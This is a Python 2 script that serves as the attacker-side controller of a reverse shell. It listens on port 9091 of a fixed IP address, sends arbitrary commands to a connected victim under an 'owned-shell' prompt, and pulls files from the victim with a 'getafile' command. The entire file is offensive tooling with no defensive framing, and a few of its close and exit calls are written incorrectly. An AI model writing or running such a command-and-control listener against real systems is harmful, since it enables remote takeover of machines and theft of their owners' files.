import socket
import os

# Transfer function

def transfer(conn,command):

    conn.send(command)
    f = open('/root/Documentos/file.jpg','wb') #Place where we saved a file
    while True:
        bits = conn.recv(1024)
        if 'Unable to find out the file' in bits:
            print '[-] Unable to find out the file'
            break
        if bits.endswith('DONE'):
            print '[+] Transfer completed'
            f.close
            break
        f.write(bits)

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("10.10.10.100", 9091))
    s.listen(1)
    print '[+] Listening for a incoming connection on port 9091'
    conn, addr = s.accept()
    print '[+] We got a connection from: ', addr

    while True:
        command = raw_input("owned-shell--> ")
        if 'terminate' in command:
            conn.send('terminate')
            conn.close
            break

        elif 'getafile' in command:
            transfer(conn,command)

        else:
            conn.send(command)
            print conn.recv(1024)

def main():
    connect()

try:
    main()
except KeyboardInterrupt:
    print ''
    print '[-] Exiting... '
    SystemExit
except socket.error:
    print '[-] Port 9091 already in use....'
    SystemExit()
